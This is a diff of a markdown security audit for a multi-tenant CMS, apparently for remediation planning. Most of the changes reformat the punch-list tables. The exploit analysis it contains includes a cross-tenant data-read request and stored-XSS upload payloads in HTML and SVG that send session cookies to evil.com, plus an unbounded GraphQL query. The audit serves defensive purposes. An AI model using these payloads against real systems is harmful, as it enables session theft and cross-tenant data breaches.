@@ -124,25 +124,26 @@ No Sentry, OpenTelemetry, or any error tracking. Production errors only appear i
 
 ## Recommended V1 Punch List (in priority order)
 
-| # | Issue | Effort |
-|---|-------|--------|
-| 1 | Fix asset upload IDOR (use `auth.organizationId`) | 5 min |
-| 2 | Sanitize filenames in local storage adapter | 15 min |
-| 3 | Fix god-mode to throw redirect | 5 min |
-| 4 | Fix GraphQL mutation detection (parse JSON body) | 30 min |
-| 5 | Add database indexes | 1 hr |
-| 6 | Replace asset count with `COUNT(*)` query | 30 min |
-| 7 | Fix N+1 queries in org hierarchy methods | 2 hr |
-| 8 | Add `NODE_AUTH_TOKEN` to release workflow | 5 min |
-| 9 | Change `workspace:*` to `workspace:^` in peer deps | 10 min |
-| 10 | Document S3 signed URL limitation or implement it | 30 min–2 hr |
-| 11 | Add CI workflow for PRs | 30 min |
-| 12 | Add `/api/health` endpoint | 30 min |
-| 13 | Add security headers | 30 min |
-| 14 | Remove debug console.logs from production paths | 1 hr |
-| 15 | Add basic error tracking (Sentry or similar) | 1–2 hr |
+| #   | Issue                                              | Effort      |
+| --- | -------------------------------------------------- | ----------- |
+| 1   | Fix asset upload IDOR (use `auth.organizationId`)  | 5 min       |
+| 2   | Sanitize filenames in local storage adapter        | 15 min      |
+| 3   | Fix god-mode to throw redirect                     | 5 min       |
+| 4   | Fix GraphQL mutation detection (parse JSON body)   | 30 min      |
+| 5   | Add database indexes                               | 1 hr        |
+| 6   | Replace asset count with `COUNT(*)` query          | 30 min      |
+| 7   | Fix N+1 queries in org hierarchy methods           | 2 hr        |
+| 8   | Add `NODE_AUTH_TOKEN` to release workflow          | 5 min       |
+| 9   | Change `workspace:*` to `workspace:^` in peer deps | 10 min      |
+| 10  | Document S3 signed URL limitation or implement it  | 30 min–2 hr |
+| 11  | Add CI workflow for PRs                            | 30 min      |
+| 12  | Add `/api/health` endpoint                         | 30 min      |
+| 13  | Add security headers                               | 30 min      |
+| 14  | Remove debug console.logs from production paths    | 1 hr        |
+| 15  | Add basic error tracking (Sentry or similar)       | 1–2 hr      |
 
 ---
+
 ---
 
 # Deep Security Audit — Exploit Analysis
@@ -162,9 +163,11 @@ This section documents findings from a deeper penetration-testing pass that trac
 The `filterOrganizationIds` parameter is accepted directly from user input (CSV query param on GET, JSON array on POST `/documents/query`) and passed to the database adapter **without any authorization check**. The adapter uses `inArray()` with these user-supplied org IDs, completely replacing the normal org-scoped access control. When `filterOrganizationIds` is set, `withOrgContext()` (RLS) is skipped entirely.
 
 **Exploit:**
+
 ```
 GET /api/documents?type=page&filterOrganizationIds=target-org-uuid-1,target-org-uuid-2
 ```
+
 Any authenticated user can read all documents from any organization. **This is a full cross-tenant data breach.**
 
 **Fix:** Remove `filterOrganizationIds` from the Zod request schemas. This parameter should only be set server-side by the HierarchyService, never accepted from client input.
@@ -176,6 +179,7 @@ Any authenticated user can read all documents from any organization. **This is a
 `.html`, `.htm`, `.xhtml`, `.shtml`, `.xml`, `.xsl`, `.mhtml` are NOT in the blocked extensions list. HTML has no magic bytes, so `detectMimeType()` returns `null` and all validation passes. The client-provided MIME type (`text/html`) is stored and used as `Content-Type` when serving. Files are served with `Content-Disposition: inline`.
 
 **Exploit:**
+
 1. Upload `payload.html` with `Content-Type: text/html` containing `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
 2. All checks pass (no magic bytes, `.html` not blocked)
 3. Served at `/media/{id}/payload.html` as `text/html` inline
@@ -190,6 +194,7 @@ Any authenticated user can read all documents from any organization. **This is a
 SVG files are detected as `image/svg+xml` but are NOT blocked. Served with `Content-Type: image/svg+xml` and `Content-Disposition: inline` from the same origin as the admin UI. No `X-Content-Type-Options: nosniff` header.
 
 **Exploit:**
+
 1. Upload `evil.svg` containing `<svg xmlns="..."><script>document.location='https://evil.com/steal?c='+document.cookie</script></svg>`
 2. Passes all checks — SVG is a valid image type
 3. Served inline from the CMS domain — embedded JS executes with full access to admin session cookies
@@ -229,6 +234,7 @@ The `path` comes from `asset.path` in the database (set during upload). Combined
 **Files:** `packages/cms-core/src/lib/server/api/routes/assets.ts`, `assets-by-id.ts`, `assets-bulk.ts`
 
 Asset routes check `auth` exists and `type !== 'partial_session'` but do NOT use `hasCapability()`. The auth-hooks middleware only blocks writes for `api_key` auth types, not session-based users. A user with the `viewer` role (who should only have `document.read` and `asset.read`) can:
+
 - Upload assets (`POST /api/assets`)
 - Delete assets (`DELETE /api/assets/:id`)
 - Update asset metadata (`PATCH /api/assets/:id`)
@@ -257,6 +263,7 @@ Asset routes check `auth` exists and `type !== 'partial_session'` but do NOT use
 **Files:** `packages/cms-core/src/lib/server/api/routes/documents.ts`, `organizations.ts`
 
 No rate limiting on any CMS write endpoint. An attacker can:
+
 - Create thousands of documents per second
 - Publish/unpublish rapidly (each creates a version entry + triggers retention enforcement = 3+ DB ops per request)
 - Create unlimited organizations (super_admin only, but if compromised, instant DoS)
@@ -270,6 +277,7 @@ No rate limiting on any CMS write endpoint. An attacker can:
 No depth limiting, complexity analysis, or field count restrictions on the GraphQL endpoint. The `depth` argument on individual queries has no server-side max in the GraphQL layer (the Zod schema caps at 5 for REST, but GraphQL bypasses it). The `limit` argument has no server-side max either.
 
 **Exploit:**
+
 ```graphql
 {
   allPage(limit: 999999) {
@@ -389,35 +397,35 @@ The password audit found **no exploitable password exposure vectors**:
 
 ## Updated V1 Punch List (Priority Order)
 
-| # | Issue | Severity | Effort |
-|---|-------|----------|--------|
-| 1 | Remove `filterOrganizationIds` from client-facing Zod schemas | CRITICAL | 15 min |
-| 2 | Fix asset upload IDOR (use `auth.organizationId`) | CRITICAL | 5 min |
-| 3 | Block HTML/SVG uploads or serve from separate domain | CRITICAL | 30 min |
-| 4 | Sanitize filenames in local storage adapter | CRITICAL | 15 min |
-| 5 | Validate `getObject` path stays within basePath | HIGH | 15 min |
-| 6 | Override client MIME type — default to `application/octet-stream` when undetected | HIGH | 30 min |
-| 7 | Add `X-Content-Type-Options: nosniff` + security headers | HIGH | 30 min |
-| 8 | Fix god-mode to throw redirect | CRITICAL | 5 min |
-| 9 | Fix GraphQL mutation detection (parse JSON body) | CRITICAL | 30 min |
-| 10 | Add `hasCapability` checks to asset routes | HIGH | 30 min |
-| 11 | Add `hasCapability` check to version restore | HIGH | 15 min |
-| 12 | Add database indexes | CRITICAL | 1 hr |
-| 13 | Replace asset count with `COUNT(*)` query | CRITICAL | 30 min |
-| 14 | Fix N+1 queries in org hierarchy methods | CRITICAL | 2 hr |
-| 15 | Add `NODE_AUTH_TOKEN` to release workflow | CRITICAL | 5 min |
-| 16 | Change `workspace:*` to `workspace:^` in peer deps | CRITICAL | 10 min |
-| 17 | Add request body size limits | HIGH | 15 min |
-| 18 | Add rate limiting on write endpoints | HIGH | 1-2 hr |
-| 19 | Add GraphQL depth/complexity limiting | HIGH | 30 min |
-| 20 | Enable `revokeSessionsOnPasswordReset` | MEDIUM | 5 min |
-| 21 | Remove stack traces from GraphQL error responses | MEDIUM | 30 min |
-| 22 | Server-side file size enforcement (don't trust client `maxSize`) | MEDIUM | 30 min |
-| 23 | Add CI workflow for PRs | CRITICAL | 30 min |
-| 24 | Add `/api/health` endpoint | CRITICAL | 30 min |
-| 25 | Add basic error tracking (Sentry or similar) | CRITICAL | 1-2 hr |
-| 26 | Remove debug console.logs from production paths | WARNING | 1 hr |
-| 27 | Add `.max(100)` to bulk delete schema | MEDIUM | 5 min |
-| 28 | Fix invitation cancellation cross-org check | MEDIUM | 15 min |
-| 29 | Configure sharp `limitInputPixels` | MEDIUM | 10 min |
-| 30 | Document S3 signed URL limitation or implement it | HIGH | 30 min–2 hr |
+| #   | Issue                                                                             | Severity | Effort      |
+| --- | --------------------------------------------------------------------------------- | -------- | ----------- |
+| 1   | Remove `filterOrganizationIds` from client-facing Zod schemas                     | CRITICAL | 15 min      |
+| 2   | Fix asset upload IDOR (use `auth.organizationId`)                                 | CRITICAL | 5 min       |
+| 3   | Block HTML/SVG uploads or serve from separate domain                              | CRITICAL | 30 min      |
+| 4   | Sanitize filenames in local storage adapter                                       | CRITICAL | 15 min      |
+| 5   | Validate `getObject` path stays within basePath                                   | HIGH     | 15 min      |
+| 6   | Override client MIME type — default to `application/octet-stream` when undetected | HIGH     | 30 min      |
+| 7   | Add `X-Content-Type-Options: nosniff` + security headers                          | HIGH     | 30 min      |
+| 8   | Fix god-mode to throw redirect                                                    | CRITICAL | 5 min       |
+| 9   | Fix GraphQL mutation detection (parse JSON body)                                  | CRITICAL | 30 min      |
+| 10  | Add `hasCapability` checks to asset routes                                        | HIGH     | 30 min      |
+| 11  | Add `hasCapability` check to version restore                                      | HIGH     | 15 min      |
+| 12  | Add database indexes                                                              | CRITICAL | 1 hr        |
+| 13  | Replace asset count with `COUNT(*)` query                                         | CRITICAL | 30 min      |
+| 14  | Fix N+1 queries in org hierarchy methods                                          | CRITICAL | 2 hr        |
+| 15  | Add `NODE_AUTH_TOKEN` to release workflow                                         | CRITICAL | 5 min       |
+| 16  | Change `workspace:*` to `workspace:^` in peer deps                                | CRITICAL | 10 min      |
+| 17  | Add request body size limits                                                      | HIGH     | 15 min      |
+| 18  | Add rate limiting on write endpoints                                              | HIGH     | 1-2 hr      |
+| 19  | Add GraphQL depth/complexity limiting                                             | HIGH     | 30 min      |
+| 20  | Enable `revokeSessionsOnPasswordReset`                                            | MEDIUM   | 5 min       |
+| 21  | Remove stack traces from GraphQL error responses                                  | MEDIUM   | 30 min      |
+| 22  | Server-side file size enforcement (don't trust client `maxSize`)                  | MEDIUM   | 30 min      |
+| 23  | Add CI workflow for PRs                                                           | CRITICAL | 30 min      |
+| 24  | Add `/api/health` endpoint                                                        | CRITICAL | 30 min      |
+| 25  | Add basic error tracking (Sentry or similar)                                      | CRITICAL | 1-2 hr      |
+| 26  | Remove debug console.logs from production paths                                   | WARNING  | 1 hr        |
+| 27  | Add `.max(100)` to bulk delete schema                                             | MEDIUM   | 5 min       |
+| 28  | Fix invitation cancellation cross-org check                                       | MEDIUM   | 15 min      |
+| 29  | Configure sharp `limitInputPixels`                                                | MEDIUM   | 10 min      |
+| 30  | Document S3 signed URL limitation or implement it                                 | HIGH     | 30 min–2 hr |
